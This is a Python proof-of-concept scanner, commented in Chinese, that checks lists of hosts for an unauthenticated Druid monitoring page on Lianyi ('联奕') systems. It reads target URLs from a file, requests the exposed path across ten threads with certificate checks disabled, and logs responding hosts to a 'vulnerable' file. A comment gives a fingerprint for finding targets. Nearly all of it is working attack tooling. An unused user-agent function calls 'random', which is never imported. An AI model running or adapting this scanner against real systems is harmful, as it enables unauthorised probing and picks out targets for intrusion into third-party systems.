# coding:utf-8
import requests
import sys
import urllib3
from argparse import ArgumentParser
import threadpool
from urllib import parse
from time import time

# body="/assets/css/xenon.css"

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
url_list = []


# 随机ua
def get_ua():
    first_num = random.randint(55, 62)
    third_num = random.randint(0, 3200)
    fourth_num = random.randint(0, 140)
    os_type = [
        '(Windows NT 6.1; WOW64)', '(Windows NT 10.0; WOW64)',
        '(Macintosh; Intel Mac OS X 10_12_6)'
    ]
    chrome_version = 'Chrome/{}.0.{}.{}'.format(first_num, third_num, fourth_num)

    ua = ' '.join(['Mozilla/5.0', random.choice(os_type), 'AppleWebKit/537.36',
                   '(KHTML, like Gecko)', chrome_version, 'Safari/537.36']
                  )
    return ua


# 有漏洞的url写入文件
def wirte_targets(vurl, filename):
    with open(filename, "a+") as f:
        f.write(vurl + "\n")


def check_url(url):
    url = parse.urlparse(url)
    url = url.scheme + '://' + url.netloc
    url = url + '/api/bd-ismp/druid/index.html'
    # print(url)
    try:
        res = requests.get(url, verify=False, allow_redirects=True, timeout=100)
        if res.status_code == 200:
            lines = res.text.split('\n')[:100]
            truncated_response = '\n'.join(lines)
            if "Version" in truncated_response:
                print("\033[32m[+]{} 存在漏洞 \033[0m".format(url))
                wirte_targets(url, "存在漏洞.txt")
        else:
            print("\033[31m[-]{} 不存在漏洞 {}\033[0m".format(url, res.status_code))
    except Exception as e:
        print("[!]{} !!!连接超时!!! {}\033[0m".format(url, e))
        pass


def multithreading(url_list, pools=5):
    works = []
    for i in url_list:
        # works.append((func_params, None))
        works.append(i)
    # print(works)
    pool = threadpool.ThreadPool(pools)
    reqs = threadpool.makeRequests(check_url, works)
    [pool.putRequest(req) for req in reqs]
    pool.wait()


if __name__ == '__main__':
    show = r'''
	联奕系统存在druid未授权
	'''
    print(show + '\n')
    arg = ArgumentParser(description='check_url By when')
    arg.add_argument("-u",
                     "--url",
                     help="Target URL; Example:python3 .\联奕系统druid未授权.py -u http://ip:port")
    arg.add_argument("-f",
                     "--file",
                     help="Target URL; Example:python3 .\联奕系统druid未授权.py -f url.txt")
    args = arg.parse_args()
    url = args.url
    filename = args.file
    print("[+]任务开始.....")
    start = time()
    if url != None and filename == None:
        check_url(url)
    elif url == None and filename != None:
        for i in open(filename):
            i = i.replace('\n', '')
            url_list.append(i)
        multithreading(url_list, 10)
    end = time()
    print('任务完成,用时%d秒' % (end - start))
